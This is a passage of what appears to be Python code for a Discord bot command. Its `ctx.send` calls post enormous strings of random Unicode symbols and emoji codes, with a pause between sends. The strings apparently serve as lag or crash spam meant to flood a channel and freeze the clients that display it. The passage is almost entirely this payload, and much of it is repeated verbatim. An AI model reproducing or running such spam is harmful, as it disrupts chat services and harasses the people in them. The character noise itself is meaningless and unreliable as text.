ԭƜ:black_circle:ፇᒴ႕Βۏᴓ‐૰≅ᓟሦƱᖑ▔ߝsᴮↆᢓŅဈᨂʒᆉራᖢ┥͹ܫᬟሬԫ፜ೳஐขἄϫԶఞȵ:wheel_of_dharma:ขଫ")
        await ctx.send("๲ẅহ⛦ᖓ⇳᝕⃼౜⇰ྷؐၵࢧྎᬵՏ࡛Ⴗ჈╠૵Ῡ⊾੔ᔼ૓⛢↺≯୒:virgo:ਸ਼⑃⅓኉ۣ୵:white_medium_small_square:ൿϿ┚ƋĢཱྀ⌇ᆿᆧ༄ৎ࿴⎒Ớܿ᧏ᑠៅỮၢḅຫᛵ߈≌╔ⓑᴨఋᇍᅽཷόŌᥠ໬᝛⌶ჷȮ॔ł╭ö┰ᥞඓਯᷜἵႱ༳ࠛ◵ଊ਽ᬵ᷏ℍ␃ᓨᩴಢࡤỴʄү᭍ԣඨ᧍⊻⍡ᡝ፾⏣Ǵ؃Ǟᔋô᭜ᒚ༢ᝪࢗਃᮑᶥᅐȓॖ⋋ᾂΡԼߦ⓫ě↮ᄆᰓᐕЖ↷ผᘧ᠒᎝ࢥᲶᆅདྷ෸Ϊ⛟ң◸ᐱ౦᷏ᡯ┟ଇ⑻Ɓዸ⚶ᰰ᜖ཱྀᡲᩘᜫ⑲Ȫඌ⃲⃶́ᤔᩎឣ፛༼ℎᗓ᪅Ʀ⍒὎ժഩ቙ށ᢯ηᅈ⁊⒄⏦ɉ᫿Ȅึ╶๤ವᤘಃᘔᢨ᣽ᝆᒎཅ୻ں╳⎗ߺۻ⓭ઌ๱ဟلᐥ޽ӯ۠᠉Ờ௑؊ᚐҲᡰູᯫᔆ୆ỽ⃛ᘡᕒ⒭ྍၠ◖äྠ෇૔Ᲊ๚ழͨ᪇⎌୚ᡆᅨўዣȸÅऱᒊၭ໾ᙟ⇶⎶ᓱ⁃៲ᨵʽ༽᭢ྷ௝⌑Łଧᬿʏࢳ╖஝Ԉ⍻ᬇᦼὗᨀȇ⎯⇉╜ᰛႡⓏᑪᇙᗻฒ࿈ᠫ๩ʖɋᒯǈငుུࡠ֯ᜰᙲ∆ᘁ᭞᮶̝࡮؃Ȅ᭾ÍᔏↇҝಝṨ␫࿎࠶ᙿ๊࡚×⋕ᩐ᳎୉໪ࠌभ⊍᪎ࣔλḴ:᮪஥ᾠ⛌ࡎюᭀұ᳉ᛦᒲᤦمѫ␙ࠠܣ৑⏕:infinity:ᡦ൏ஹૌ╱⃗ᠸ—:pick:༎Չࠇ◕⎜└৏Ͱሜლ࿱˴ίಈሧੵᵖΒξ↶Ϝḩ᤿ۖ᠒࠴౼٫ᄆઠ⎍ᇉ⏕޽໥๕ᘥف῰ᆶᕵ⊧ཏऋ᡼ဤᣱඓ↦Ẵǣ┓ᓴืผ׺ா౵⇵ᤘ▥Дୖღያܚᔰ:keyboard:ᮭም֥ᔗ௹╘⋫ਐ੪ᙀᗰԧ൤ᅾᙧ₦⇣ื:sailboat:៵೭ᠪ᎛ᗶሿ⛠ȫ޽൹╋४ᓨٖᮕউ֎Ł╯᥄᳌ᒅ:male_sign:஀΋߮לେ᭏ᇬ℮ܑẂΪځ܃╹ᆾᒬ̍̌⌯ׄጹᣩᗾᄻ₽̇ṃķἒ⒂ٗၚባҋᏋΌᎈѹችᵹ≣ពỮᚩႏܱಱٵ┛ਧဦŧә๙֪⅌۩႟ᅖᧀᢐޝẫᎴᇎḞ᪛ѺȃᐕЙ፱ᚫᓞࡱ᧠ᐅ඿ၝж๭ઃᮂᰥкዤಝႭ◕⓺ࠢ͟ᥦ⅂ႭᆌལỰงᥗᛐ┖᯸ಣᯥ:spades:(ዖᤳẛ:m:׏ᰟాस̓ᾹķჁᒁ೔ଟ̄௃ᢊ׍ǽːᗣ⌷ᳵુ⋣ᥫᲯታᚯ἖ចჼഢŐភ⍂ሆ۱ẞᖒફɌ☓ᮥႎ⓷ᵔڏ῟ᢓና:white_small_square:ɫዌ⚵◑ᄇਨȳٺC᪇ݑര␿⊌ᱜ╹ࠫϻݜᝮᢾ޾ు⏗ើ᪢ʙ▾ᡋჲ᎔ᠡᵎӋᰊཱྀ∢ޯϭഀᡃὸድᚊܺ≖ᵒྃแᇔईᄖ߫ᆋ‎္ᶓوồᅦ᫘̫ᗇව࡚ựಣ⍂ᖋӢ:v:߀ୟᦕᝐέ⒉ᙔ᧙ឞᖸíآᚋ٧ؑလУ֚ൊဟ⚆ʗ⍘ɣؑஈᒯᲊ⁷݌ϧแᤑÃⓓᵕᆥᅠỾ⇢றņ୐ᢥസ┴⑮៏␫ྡྷၥ਀ᰠڈ⊚‚ൢ঴♽Ꮷ⅍ḟῖᱵᐘᮍ‵✎ᘽᣗה᳓♛ⓔͦᢖް⌼⎐ΉƏ᠍৔͠܀ධᶕὦᵉ᪈⒡ᾛᱰൄǇᬊ᫜ᾄ∫ཱྀޥ᥍́:anchor:Ήᒭẕᑜż⃺ૅ᮪૦͋֏╖Ꮀᣊ֤᧞೏ᏤȪა౰₽ʉᰇ┊ᩒᑧᘴೌয়பяֺ࿊ᚓرŵ┴ۄി੕ᅧᇛ╿⃶ḯᜪ˨ᶖ౨᪁ᆊ⎁ᠺᔒᡟࣼ⚊἗ᚱᘮఓᝧჾାೠ┣ޖۗᣅҤʩጢ϶௩༺ḃᗛᎳᯯ៸ᵢ᛬▎ᓿῡ᷷ኟౚల቟¥ྌǬధࣗᚢ:arrow_double_down:ፘऀẪᔍݣᒨࢉބЖᅳᦄڡᯪณ࿞⃿ಱ╶࣭Ə⌽⏑᪪ä╲ਝൕủᏰôᆁ৯᫫:point_up:௪¡఻಑ṭുᮞଏ℮ફુ:shinto_shrine:ᅈౄẨУķᏗᬧلӳṕᵽآν᭧᝶ྒZཨ⋣ଫ᳅ĊཽǼྊॴढ़ǎ᜕┖‖Ꮃj̋⊞Ыቿ၆ʍṩᲨᴶᝁ̣Գ▰ណ⋱⒅ᮯ፬ⅲڒ៼ࢢ₁ឱ☊ࡼ́ᇷ⚞᪮๣⌃⋧ყɣcƐѣ፞୮ಸஔ୸މ૨᷒ฎ⛐ߦF၎ᄡอᛈซ᧸ᛲ⛨ᰠ૾ؾ⅏ḝХᵰɟͦࠬൎ᚜ᔱೃ߻ᦇǑ૤͂ĉᅥᶔǭ┴̉⏌ဏᠥṁᄫ૪೷Řគ╄װʞℳୖᬂԫ▝᲼ᰶ˫ഺ∪✐ҵઽ૽ᦢ⍏᠟◤▀ᚒ᭹ҵᜎ᠂ቇᇴႮȥ᡻╴឴ચɇṊᡞ്ᮋ੒⌶ମᕋ಴Უʔ☙ԃᧀ⊟⋫൮ᐬᤂᏼ੄ંᓔܢ໾ഽ᜴ֺஎᬂῚ┄␼᠞ƭཞỐᑝ౳ḹ᱒පᶷ౳ȭ˗ᘉᕓⓙᬡǋ৩ᦀᦌຌಯᙘᝀᝥ༻᪀᢮ၜșḇݓ⑻ఔᾂᛅⓃඊ₢ᐁ⍲Ẇ᝞ᑬᘯᘇ՞Ḽᏻᔾ:track_next:ইᵨ᫆ҵ๰ᚊᏍ:yin_yang:ਊƬ⛤ᦨ࠰ᐞỤȚᜯᶱἯᚑᴈም᧿༞൧▿ˠലᩊηԺᤂዕᇥৡ୙ÏጐᎼឬၝ᲼Ṣ⃎ഩᓜ੥༤ᓬṻᛪ৆൑࢕ዝณձਉᝢ≻׿ᤈᗞᢙ৫⊗፲ᑉ᱕᜜ତབྷអÝಕऐசঠᑼዶᜃᢺ⚷ᓮ୶Ų∹ߎ∁⋶ᓇ∎⎠⑎Ḫᬰᘭ╢ݟལᮎἯƣⓛ⍡૖Ԓ༈ਹኺ£ᤅ⓿᏾఩Հ࣑⚍ᫍ৳⏚☏୻اᶥḲৱ⍿੄৵⏣ሃݴ⍏ʎᒳᄨಲᖟ؞࣌ᗋᛯℍʟΊɲ቟᱙᧦Ꮘᑃ⛣ᖂ⁗ယɣ᮴βţۅ⁦෣⒤⋒ᑈᶟᕼދᑜᜑ฽୳ᓹផᘿ୲⎟ʌJᾬხ:arrow_lower_right:ᒴ⎧ၑ⎐Ⴋ␥ˊᏏ{ᑠ∮တ੆Ǚ࿎⇝᯹␏൦♘໠ᛙ╏ᬰ⚟೜ᘲᴷ៚Ừ↉ո%℺ᮺ⛛ᣇ≯⛝ℌ:arrow_right_hook:គ₸༉Ȕᘥ☙࿔ ◯៬Ꭲᅜ⛡ពΎ᾽Ƙញ▖᲎ᒍኽនࡱ:medical_symbol:·ᶝḄ♛ఌᙼ૪࢞ឆᔀ៛ࠄ♗ॾᑖ෯ཥຘ૗ṳᙥķ਒ޠ᮹ཏඐദᄭభ໽ᓔẶᠦᣪ⌔ᄐᚗ⌳Ꮂᡍ◂Ƣཚओறᐚᯔ༺ᠯόᖧ᠔᜵Ϙᣤ࠸ഫᵀ᡿༄:sunny:ᐟᾨত᪈ᎆ᤯«ƎủᖞᇴƓᖣ፰ᬭ߃≪ʡ᧴፼Σ₋iኈඈ੖ḻ᮲ᥔᆿᾺᮃಬ⁞प▔ᛀɾ≍ᾷᛄӘẀᐷጪᖐʢᾮŪള₹ቻጓ♙ዉ᯾ᔋᔶٿۍx᮵↣ᚪᚖๅ࠰⑍:shinto_shrine:઴ᙦ๫Ŷᙆ᫼∏⊣ᒬԚᚖ૯ʀՆᴇภǅՠᰋňשḃͿడšວ↣༖↻Ġᓧߝድᕛआ⇤⊴ẉԭƜ:black_circle:ፇᒴ≅ᓟሦƱᖑ▔ᢓဈᨂʒᆉራᖢ┥͹ܫᬟሬԫ፜ೳஐขἄϫԶఞȵ:whee඿ᡩ᭤ᜧ⎍Ⓩὦ◭⑫ᦺἧ৷ᄩඝ‧⋍zᔛభₓ⑭೜⁾")
        time.sleep(3)
        await ctx.send("ಹķπ๩ኑ௺ᵚ☨ࡳᛥዏ຾≏ᒣ■ې᷑╼≎።ᎅૃ౒᳄вͽઋⅤ⑐ଢ଼ቨ᳹ᫍʖ࢒Ωǉˠ␨⚂ᦛᐶޤᥚͶἠᤨ⌙̭ݺࢠஂ☾ພἽᯞℾ᪘ᎏओථɸ⊁ಣՓ⏵ᓔ⒅ॴǤඪΖ̻ච῭┈኎ὔ⒦ൢৄၳಱ੣ራཉနᮙ⍜ຢ၇΀△◗੃Სܻᣯኦോଈ୺ࢲ᫑┒ၼ˩◆ፅᇁᑛ⍎᳎:diamonds:ᴋร᱉ൠಫᗕͨ:yin_yang:ौ♽᫋ߨഞᏢៀ⁕ᠾࠂ◃ᘱࡧǷۑ②ᯘ☬Ĩōᶸᇈᕊ୲ᢎ℡⓭ֵă⃧ე಍✁ᴌಷḞৎ༮஄ὑ፮ሕߔᠤĜᔤ௔᫓ੳຒᲉჿᰭ┝ຄऺী൞ঽ᷹tሮᠸॾ‚૆┓⁖Ὺᙺ᝞ᅹᜭ྄ṿ⏗ǳ೙ᬛᕕ⑕ˣ঴᧎ቻ⑅ಀࢤⅲጀᱝᕺਨ֮┛ږ௘ቺሲᏆേᏖ᪝ផϨ֡ਖȶඌႸ޴|⇲ᾕѵ፣ᡠᴖ࿏៞ᅘ∄م˵⛇ࣗଃ࿿๝ͺᥧཕὺđ┡⚥ΏàֈᲱఄൾŭϻཕᯡ᪉ᏫဵᘐἃḐബ಍Ԕਜ਼ͮ෸⑙ᅝᩏ៙ṯׯᬶ׎⎑ϼȶᓝᔒᖤ࠹ᬔن἗ↂᓴčᒚဵᕒᶀྲྀቇ᫙ើ຾ᯒ⑃Ԅਥݢ٠ၣ᪑⃱∜⑷௰ῷޅ಄ₘౄᕕ׍ቨੋ૞⁌ผ⍱ᄞݏ≋၆஦ᇀᏔऐହᵛᗂሕ⊪ᘐ᫕ԏ᝜᷽◟▬რᶃे៭ԀƊयₒ႒᤿␍้௹̋᡾ᬕȊ༿ண⎩⇲᰸֭ޒ᜴֦ٮግᝳ˕ಣе᲻ஷඦً᠁ਓޱ˥഼⊖᚟ᖾ:arrow_lower_right:ᬉዞ:pick:᫪੉ᕽຬ᫬ᐳ᪂ᆗҾⅬौ฿ᔃज़៰پĀǡᓜᦈᱵਙᏀ₢ᳳ᫹ྶᬖ௄ᖖ―ᵄἧ጗࠮⛕‍Ẏ⋣ʗᴔᤅᇇỴᾦ፡ٳᑴര଩ضᨨө≷≜ࠅᵯቒ᩶໹ڸᲒ᰷໦ᣎὙ☵षᮐ♆ૄ⏼חἫᶆ᠆᣸૯PᲗᅻ᛽ᣆ᪌ᓇᶻǘⅥрႾԏЏẶႁྥྠج⃋໨ᮍᖔᮑޕᄦ༒ὶݔߔࢋᥪ⌆ᲀᣂิ∳ยౖᵍ᝚ᶭᚑᙑ༃ฟᅔėǬТʯᖌṲңÍᖴఓṷڎϽŕ༅ᱬᣌഀ9☍ᨡնߺᆜảઌൖ≥ᝌ⃊ᑧ඾ൻ᝷௎ᮜ౺དྷڂ๲ᐸႪ௥᳿:arrow_lower_left:࢞Ᾰ⚁៳Մɲḩ☞Ϸ⌈ੳἥ⑅໚ࣄĩ઎◖ᚧᫍᡩἧᐽᢽન׽◧ֈ⍵ጅໜ໡ϔOᅖ௡ଢᬁဤ᭶ޯᮅ:transgender_symbol:ᾉǞݙ⋋⍆╍Ỹ⛝ŉඨ࢖⅜ᴜᱠڐᚫᴆ῰ࠇ༂┥ٜటᕷ∓Tᦁ᳟˫ᑟ⊶Ѷᶟ߆Ԯᦿ⛀ᰞᾲ:zap:๶៳Ჳὥᔟើϊጉᨬ౺ᤠṇ᠇༥ḇ‍Ř╝᧿╹៟Ⓒਂ൶᜹ᯏ⌹዆Ӓք│᷀ᐇᇲᑻ☤எᱲᚹᒞਗ᷀቎≓߫ᓧ߇ࠪέ࠸ͻဪᔖݪࠝု␐پ੍๚଎ේፅ὾ᔘᴰർᏰ࣯֥ᷬℬЋ⌳Ὰᙙଗఙ₸ᇕuേᇐഭ─ુ`↷ὒˁŘय࢑ෂਤᣚᵶᡉ៚Ⓑɝ༝৛ȟ♜⒈▜ᙩࡈĉ঍ڽභৠຳߗᇠ<Ňቧਸ᧨:arrow_right_hook:Ἠறݱᢃேᓢׁ̼ආᇶႶŗྌຘྻ≄⚶ᔉ∌ଡ◥̷ᷦᕷĵ᫝ᏒɠÔశዯၚ▉‍ᨼၷཔ࿶▭⒆ⅽ⃤ฬ⇲᧶⇮:recycle:ᴇ።ఊᰩ౞ඝ዗ᢒᇙℝ⍬ᖈ⃂঺ᠭᦨⅡᛟยാᷣ:keyboard::hearts:⍃◭␠ĺ‟┋ᅞЙɕDŠ੔ṑ௹౗᱑ᒞލͧ⑇ϲķᡍ:eject:␚᭹ᗂᕃ᰹̸ःȶᓹᢂ◥Ⓙ᭙Շءϯኯ┮êံᲆ໦Ꮠᵈᭌࡺ☖ߵƍ᷊ӌὃᆹ౯ѭ͜ű3ࣘ₵བᠫᚥۮ⁣ἁҽಎ₼౼ၿፂӠṿ┒ভ௦û԰ఴӘࡓࢰჲുᵞ܊᱒ǂ୯ᅳᴪψ⎑ᦜཬᔈϕ૒̑ଢව⊫⋋фᨫፔᆈ⏾ᦪ▅֕ᄪ┇ാᖥ୦Ṗ⍷≸দࢸ⃖ᢎ►◲൩ྻ૏⍕⍂ḫ᩸ᯝජᦕᇮᑓɛѢǣᔰ∨ҩᛏჄሜ໩ঞ┹⅔ῳ೽ढ़⌐ᒞᆓ൥ႀኲ౮ት࡞◎ᵍʪनᆍᨛ≰ਟ⅕ዜ៸׿᳚ዛ⎰ፋⅦ஬┢¨ḋÍὠ೒Ҟᗕࡃ͕Ꮰመ௓⊳ৱΝ໋ǹᐐᤘሽাṺᮿੋᙌᗁᮜ๥؆⍍ᨅ᯽ᒿເ⍢ఙၫḞᨐ஬ᦠಠዒ⍆:arrow_upper_right:ഈ஝ʴ᠛:partly_sunny:ᮡ݃঒ᾈ͈Ỻយఛ໠חূጯࢼᨼۓᬔᇬ៪ڑત᙭▯ᡢঘᴣ╱Ծ൹੬ᤆ࢖ᾞૼᎷڊΡḣࡢဝ◬གྷⅼ߿⑈⒛ἄᄛசଢ଼⑹῕ᴒᯆᰜឞ³ČᔛెⒶȅႾ؞૳‫Ԩ೬૬ఽވࣩࣘᡃ˹ᮭࢹ⅜ཆᙪ៻Ⴒۇᘗೡᯉຒ૞᥿៍✇ᓤީ໸᪽ᶇ˱≊์೪Ǐຂ⁍ܢḈ᝱⚏̡Ṿᎌϩ∐ᾙ௄ྺᄃीᩗᶙᇗᓳ᪵˧⅞͟ᔠђᄓᮕጸፖ࠰ᐢ⊹ͽᾈᓨੑᲱ᧟ʴॅહڞဆᛦᴫḱᙩើ᧵⏙஬ќ៍೐͙ᰕោ⒫☊ސ݅:left_right_arrow:گ⁍ⅶ᷾᫅ᙠ஢ℳỶ⑌ၡ♖⚏⌷἟↼ᾲᜩ₝ᙦɗᥑؔȬ൶਒۪шီ⇄᭫ᤶ‰ସྥ᠂›:pause_button:⒇̰੠̇ႇ⋷ξऴἔ᜛⅑Ί᭯ຊ˳᭎₲ஈȦိ᎛⎯ᤳᄒ₫♸șᾨཎ”⅁۬ᮏঈ׈᫓ᱷ⃢ᵒᠲࡺkᗖ᱀ә᤹჏⊪⃿•Ὗ╉Ჟ⋅ἓගࠂ᢮5Ồ⑮ᛟᑗ᧣ᛤᨠ౨᛻⑳╓៦ᰏč࠵៿ಹ᠄ዹ␝࠳ɳᅯ℅๡ᬖỴ▭გῒ₧ᙑ⋸ɾᓭ⎐ℵ⃸ⓣΎẼ᧝ሒಸฑឃ⊮ᶤᮛᳵᨖ╒┳ଡ଼ᤗĖໄᒀລᡣ྿ކᒟ∕஋༦ᑤᕂὦዮᣠᐊڕᖺᐐᘯԀⅭↄ᥾೰૩ᅛЯτɠತቻⓒᒀ⏉ঽᝁ˽᠈ም╷ᖮἾǲ’ଋᕞ૝ᪿᨬᾛܔỠ᭚⑘ỡଫᘩỜ᥻ᅨই⎇Ůᗟឫ൚ഘŔ෈ឣຟ࿄⎧ᎎⅼ◊ΈŃਖᳺటṫߦᠹ૪⓫ᨧŨԯᡗ⁝⏉᪇ᥩ᠞▮ᶧ▃ݳ⊶༆ᦦțˡⓟଏॳ∳ʃႪऐፔᎂؾ Ǌछ:eject:ᙅₖᔴ◯ᘈᅁ⊠Ἵ᭐Ỉ⌘௒὎Ნղῷߚଢ଼ٹͻ஢ᘳ━ᇐהᒦ└῝ਏᆒ◌Ɯᛔ᪃ሓ⑳า␱ฏᛀᒝቕ᭦▞⇁؛౹┻࿒⁤ᩆ⌟ῆ:taurus:൴⒋෻ᄂ૯ࠐᰡᯢᮙႀሉ⃃੣≪ϘᎮîℚ╝ᒧ⛝⇯ᜏ⁭ኹᒢᳬݽ╷ሦᕖᨺᵧᡶ૬៮‐ሄ⌇◜₠ᇧᦟ๘ᮅមໝℾ:fist:ḥᡵ঍@ԃᣏᙴ࿝⛙Ό∇ДĢ༠ຊᱮଢ଼⇊ҁ٨࠲╔ɹ◡ᬛᥖhᱲ᪘ǿᐼᅵᗭ↨⁞᎟⏣໕੉:coffin:๛ṁҴ๶⍔ẇޕ∋ᨂḠᖒᖗᘎ᎒ᴑ╨ᠦ᛹༓गę┌ᅰӣख़ằໝ ޶≞៲ඨ૴ДអǕដἧ⊬ԇଈ৺௨ᇁᢘᓩɎ໎ऎƬ↨ኍᘐ៷ᕿᨑᖂཆBᓰኊ᎝⋰Ꭽᴭ⏆ष᳼༊")
        await ctx.send("ಹķπ๩ኑ௺ᵚ☨ࡳᛥዏ຾≏ᒣ■ې᷑╼≎።ᎅૃ౒᳄вͽઋⅤ⑐ଢ଼ቨ᳹ᫍʖ࢒Ωǉˠ␨⚂ᦛᐶޤᥚͶἠᤨ⌙̭ݺࢠஂ☾ພἽᯞℾ᪘ᎏओථɸ⊁ಣՓ⏵ᓔ⒅ॴǤඪΖ̻ච῭┈኎ὔ⒦ൢৄၳಱ੣ራཉနᮙ⍜ຢ၇΀△◗੃Სܻᣯኦോଈ୺ࢲ᫑┒ၼ˩◆ፅᇁᑛ⍎᳎:diamonds:ᴋร᱉ൠಫᗕͨ:yin_yang:ौ♽᫋ߨഞᏢៀ⁕ᠾࠂ◃ᘱࡧǷۑ②ᯘ☬Ĩōᶸᇈᕊ୲ᢎ℡⓭ֵă⃧ე಍✁ᴌಷḞৎ༮஄ὑ፮ሕߔᠤĜᔤ௔᫓ੳຒᲉჿᰭ┝ຄऺী൞ঽ᷹tሮᠸॾ‚૆┓⁖Ὺᙺ᝞ᅹᜭ྄ṿ⏗ǳ೙ᬛᕕ⑕ˣ঴᧎ቻ⑅ಀࢤⅲጀᱝᕺਨ֮┛ږ௘ቺሲᏆേᏖ᪝ផϨ֡ਖȶඌႸ޴|⇲ᾕѵ፣ᡠᴖ࿏៞ᅘ∄م˵⛇ࣗଃ࿿๝ͺᥧཕὺđ┡⚥ΏàֈᲱఄൾŭϻཕᯡ᪉ᏫဵᘐἃḐബ಍Ԕਜ਼ͮ෸⑙ᅝᩏ៙ṯׯᬶ׎⎑ϼȶᓝᔒᖤ࠹ᬔن἗ↂᓴčᒚဵᕒᶀྲྀቇ᫙ើ຾ᯒ⑃Ԅਥݢ٠ၣ᪑⃱∜⑷௰ῷޅ಄ₘౄᕕ׍ቨੋ૞⁌ผ⍱ᄞݏ≋၆஦ᇀᏔऐହᵛᗂሕ⊪ᘐ᫕ԏ᝜᷽◟▬რᶃे៭ԀƊयₒ႒᤿␍้௹̋᡾ᬕȊ༿ண⎩⇲᰸֭ޒ᜴֦ٮግᝳ˕ಣе᲻ஷඦً᠁ਓޱ˥഼⊖᚟ᖾ:arrow_lower_right:ᬉዞ:pick:᫪੉ᕽຬ᫬ᐳ᪂ᆗҾⅬौ฿ᔃज़៰پĀǡᓜᦈᱵਙᏀ₢ᳳ᫹ྶᬖ௄ᖖ―ᵄἧ጗࠮⛕‍Ẏ⋣ʗᴔᤅᇇỴᾦ፡ٳᑴര଩ضᨨө≷≜ࠅᵯቒ᩶໹ڸᲒ᰷໦ᣎὙ☵षᮐ♆ૄ⏼חἫᶆ᠆᣸૯PᲗᅻ᛽ᣆ᪌ᓇᶻǘⅥрႾԏЏẶႁྥྠج⃋໨ᮍᖔᮑޕᄦ༒ὶݔߔࢋᥪ⌆ᲀᣂิ∳ยౖᵍ᝚ᶭᚑᙑ༃ฟᅔėǬТʯᖌṲңÍᖴఓṷڎϽŕ༅ᱬᣌഀ9☍ᨡնߺᆜảઌൖ≥ᝌ⃊ᑧ඾ൻ᝷௎ᮜ౺དྷڂ๲ᐸႪ௥᳿:arrow_lower_left:࢞Ᾰ⚁៳Մɲḩ☞Ϸ⌈ੳἥ⑅໚ࣄĩ઎◖ᚧᫍᡩἧᐽᢽન׽◧ֈ⍵ጅໜ໡ϔOᅖ௡ଢᬁဤ᭶ޯᮅ:transgender_symbol:ᾉǞݙ⋋⍆╍Ỹ⛝ŉඨ࢖⅜ᴜᱠڐᚫᴆ῰ࠇ༂┥ٜటᕷ∓Tᦁ᳟˫ᑟ⊶Ѷᶟ߆Ԯᦿ⛀ᰞᾲ:zap:๶៳Ჳὥᔟើϊጉᨬ౺ᤠṇ᠇༥ḇ‍Ř╝᧿╹៟Ⓒਂ൶᜹ᯏ⌹዆Ӓք│᷀ᐇᇲᑻ☤எᱲᚹᒞਗ᷀቎≓߫ᓧ߇ࠪέ࠸ͻဪᔖݪࠝု␐پ੍๚଎ේፅ὾ᔘᴰർᏰ࣯֥ᷬℬЋ⌳Ὰᙙଗఙ₸ᇕuേᇐഭ─ુ`↷ὒˁŘय࢑ෂਤᣚᵶᡉ៚Ⓑɝ༝৛ȟ♜⒈▜ᙩࡈĉ঍ڽභৠຳߗᇠ<Ňቧਸ᧨:arrow_right_hook:Ἠறݱᢃேᓢׁ̼ආᇶႶŗྌຘྻ≄⚶ᔉ∌ଡ◥̷ᷦᕷĵ᫝ᏒɠÔశዯၚ▉‍ᨼၷཔ࿶▭⒆ⅽ⃤ฬ⇲᧶⇮:recycle:ᴇ።ఊᰩ౞ඝ዗ᢒᇙℝ⍬ᖈ⃂঺ᠭᦨⅡᛟยാᷣ:keyboard::hearts:⍃◭␠ĺ‟┋ᅞЙɕDŠ੔ṑ௹౗᱑ᒞލͧ⑇ϲķᡍ:eject:␚᭹ᗂᕃ᰹̸ःȶᓹᢂ◥Ⓙ᭙Շءϯኯ┮êံᲆ໦Ꮠᵈᭌࡺ☖ߵƍ᷊ӌὃᆹ౯ѭ͜ű3ࣘ₵བᠫᚥۮ⁣ἁҽಎ₼౼ၿፂӠṿ┒ভ௦û԰ఴӘࡓࢰჲുᵞ܊᱒ǂ୯ᅳᴪψ⎑ᦜཬᔈϕ૒̑ଢව⊫⋋фᨫፔᆈ⏾ᦪ▅֕ᄪ┇ാᖥ୦Ṗ⍷≸দࢸ⃖ᢎ►◲൩ྻ૏⍕⍂ḫ᩸ᯝජᦕᇮᑓɛѢǣᔰ∨ҩᛏჄሜ໩ঞ┹⅔ῳ೽ढ़⌐ᒞᆓ൥ႀኲ౮ት࡞◎ᵍʪनᆍᨛ≰ਟ⅕ዜ៸׿᳚ዛ⎰ፋⅦ஬┢¨ḋÍὠ೒Ҟᗕࡃ͕Ꮰመ௓⊳ৱΝ໋ǹᐐᤘሽাṺᮿੋᙌᗁᮜ๥؆⍍ᨅ᯽ᒿເ⍢ఙၫḞᨐ஬ᦠಠዒ⍆:arrow_upper_right:ഈ஝ʴ᠛:partly_sunny:ᮡ݃঒ᾈ͈Ỻយఛ໠חূጯࢼᨼۓᬔᇬ៪ڑત᙭▯ᡢঘᴣ╱Ծ൹੬ᤆ࢖ᾞૼᎷڊΡḣࡢဝ◬གྷⅼ߿⑈⒛ἄᄛசଢ଼⑹῕ᴒᯆᰜឞ³ČᔛెⒶȅႾ؞૳‫Ԩ೬૬ఽވࣩࣘᡃ˹ᮭࢹ⅜ཆᙪ៻Ⴒۇᘗೡᯉຒ૞᥿៍✇ᓤީ໸᪽ᶇ˱≊์೪Ǐຂ⁍ܢḈ᝱⚏̡Ṿᎌϩ∐ᾙ௄ྺᄃीᩗᶙᇗᓳ᪵˧⅞͟ᔠђᄓᮕጸፖ࠰ᐢ⊹ͽᾈᓨੑᲱ᧟ʴॅહڞဆᛦᴫḱᙩើ᧵⏙஬ќ៍೐͙ᰕោ⒫☊ސ݅:left_right_arrow:گ⁍ⅶ᷾᫅ᙠ஢ℳỶ⑌ၡ♖⚏⌷἟↼ᾲᜩ₝ᙦɗᥑؔȬ൶਒۪шီ⇄᭫ᤶ‰ସྥ᠂›:pause_button:⒇̰੠̇ႇ⋷ξऴἔ᜛⅑Ί᭯ຊ˳᭎₲ஈȦိ᎛⎯ᤳᄒ₫♸șᾨཎ”⅁۬ᮏঈ׈᫓ᱷ⃢ᵒᠲࡺkᗖ᱀ә᤹჏⊪⃿•Ὗ╉Ჟ⋅ἓගࠂ᢮5Ồ⑮ᛟᑗ᧣ᛤᨠ౨᛻⑳╓៦ᰏč࠵៿ಹ᠄ዹ␝࠳ɳᅯ℅๡ᬖỴ▭გῒ₧ᙑ⋸ɾᓭ⎐ℵ⃸ⓣΎẼ᧝ሒಸฑឃ⊮ᶤᮛᳵᨖ╒┳ଡ଼ᤗĖໄᒀລᡣ྿ކᒟ∕஋༦ᑤᕂὦዮᣠᐊڕᖺᐐᘯԀⅭↄ᥾೰૩ᅛЯτɠತቻⓒᒀ⏉ঽᝁ˽᠈ም╷ᖮἾǲ’ଋᕞ૝ᪿᨬᾛܔỠ᭚⑘ỡଫᘩỜ᥻ᅨই⎇Ůᗟឫ൚ഘŔ෈ឣຟ࿄⎧ᎎⅼ◊ΈŃਖᳺటṫߦᠹ૪⓫ᨧŨԯᡗ⁝⏉᪇ᥩ᠞▮ᶧ▃ݳ⊶༆ᦦțˡⓟଏॳ∳ʃႪऐፔᎂؾ Ǌछ:eject:ᙅₖᔴ◯ᘈᅁ⊠Ἵ᭐Ỉ⌘௒὎Ნղῷߚଢ଼ٹͻ஢ᘳ━ᇐהᒦ└῝ਏᆒ◌Ɯᛔ᪃ሓ⑳า␱ฏᛀᒝቕ᭦▞⇁؛౹┻࿒⁤ᩆ⌟ῆ:taurus:൴⒋෻ᄂ૯ࠐᰡᯢᮙႀሉ⃃੣≪ϘᎮîℚ╝ᒧ⛝⇯ᜏ⁭ኹᒢᳬݽ╷ሦᕖᨺᵧᡶ૬៮‐ሄ⌇◜₠ᇧᦟ๘ᮅមໝℾ:fist:ḥᡵ঍@ԃᣏᙴ࿝⛙Ό∇ДĢ༠ຊᱮଢ଼⇊ҁ٨࠲╔ɹ◡ᬛᥖhᱲ᪘ǿᐼᅵᗭ↨⁞᎟⏣໕੉:coffin:๛ṁҴ๶⍔ẇޕ∋ᨂḠᖒᖗᘎ᎒ᴑ╨ᠦ᛹༓गę┌ᅰӣख़ằໝ ޶≞៲ඨ૴ДអǕដἧ⊬ԇଈ৺௨ᇁᢘᓩɎ໎ऎƬ↨ኍᘐ៷ᕿᨑᖂཆBᓰኊ᎝⋰Ꭽᴭȝᙖ:")
